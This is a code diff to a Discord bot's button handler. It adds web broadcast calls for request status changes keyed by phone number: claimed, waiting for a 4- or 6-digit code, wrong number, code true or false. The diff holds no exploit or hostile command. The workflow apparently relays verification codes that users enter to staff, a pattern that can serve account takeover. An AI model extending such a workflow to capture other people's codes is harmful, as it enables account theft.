@@ -65,6 +65,7 @@ import { recallMessage, forgetMessage }                  from "../utils/messageS
 import { isStaff, isOwner }                               from "../utils/permissions.js";
 import { getLang, peekLang }                               from "../utils/userPrefs.js";
 import { t, tApi }                                         from "../utils/i18n.js";
+import { broadcastRequestUpdate, broadcastRequestRemoved }  from "../web/broadcast.js";
 
 // WHAT IS AND ISN'T TRANSLATED IN THIS FILE
 //   Translated  — every ephemeral reply (safeReply) and the DM embeds, since
@@ -419,6 +420,7 @@ export async function handleButton(interaction) {
                 embeds:     [newEmbed],
                 components: [buildPostClaimRow(phone)],
             });
+            broadcastRequestUpdate(row || { phone }, { status: "processing", claimedByDiscordId: interaction.user.id });
         } catch (e) {
             // A genuine network/timeout error here doesn't necessarily mean the
             // claim failed server-side — the API client retries transient
@@ -462,6 +464,7 @@ export async function handleButton(interaction) {
                     `*Waiting for the user to enter it…*`
                 );
             await safeEditMessage(interaction.client, interaction.message, { content: pingUser(interaction.user.id), embeds: [doneEmbed], components: [] });
+            broadcastRequestUpdate({ phone }, { status: "waiting_code", codeLength: 4, claimedByDiscordId: interaction.user.id });
         } catch (e) { console.error("len4 error:", e); await safeReply(interaction, deferred, { content: t(lang, "generic_error") }); }
         return;
     }
@@ -481,6 +484,7 @@ export async function handleButton(interaction) {
                     `*Waiting for the user to enter it…*`
                 );
             await safeEditMessage(interaction.client, interaction.message, { content: pingUser(interaction.user.id), embeds: [doneEmbed], components: [] });
+            broadcastRequestUpdate({ phone }, { status: "waiting_code", codeLength: 6, claimedByDiscordId: interaction.user.id });
         } catch (e) { console.error("len6 error:", e); await safeReply(interaction, deferred, { content: t(lang, "generic_error") }); }
         return;
     }
@@ -498,6 +502,7 @@ export async function handleButton(interaction) {
                 .setColor(0xef4444).setTitle("❌ Wrong Number")
                 .setDescription(`❌ The user is being redirected to re-enter their number.\n⏰ <t:${Math.floor(Date.now() / 1000)}:R>`);
             await safeEditMessage(interaction.client, interaction.message, { content: pingUser(reporter), embeds: [doneEmbed], components: [] });
+            broadcastRequestRemoved(phone);
         } catch (e) { console.error("wrong error:", e); await safeReply(interaction, deferred, { content: t(lang, "generic_error") }); }
         return;
     }
@@ -523,6 +528,7 @@ export async function handleButton(interaction) {
                 embeds:     [unclaimedEmbed],
                 components: [reclaimRow],
             });
+            broadcastRequestUpdate({ phone }, { status: "pending", claimedByDiscordId: null, codeLength: null, staffCode: null });
         } catch (e) { console.error("unclaim error:", e); await safeReply(interaction, deferred, { content: t(lang, "generic_error") }); }
         return;
     }
@@ -558,6 +564,7 @@ export async function handleButton(interaction) {
                 })
             );
             forgetMessage(phone); // terminal state — no more refreshes needed for this request
+            broadcastRequestRemoved(phone);
         } catch (e) { console.error("truecode error:", e); await safeReply(interaction, deferred, { content: t(lang, "generic_error") }); }
         return;
     }
@@ -601,6 +608,7 @@ export async function handleButton(interaction) {
                     components: [buildPostClaimRow(phone)],
                 })
             );
+            broadcastRequestUpdate({ phone }, { status: "retry_code", claimedByDiscordId: interaction.user.id, staffCode: null, codeLength: null });
         } catch (e) { console.error("falsecode error:", e); await safeReply(interaction, deferred, { content: t(lang, "generic_error") }); }
         return;
     }
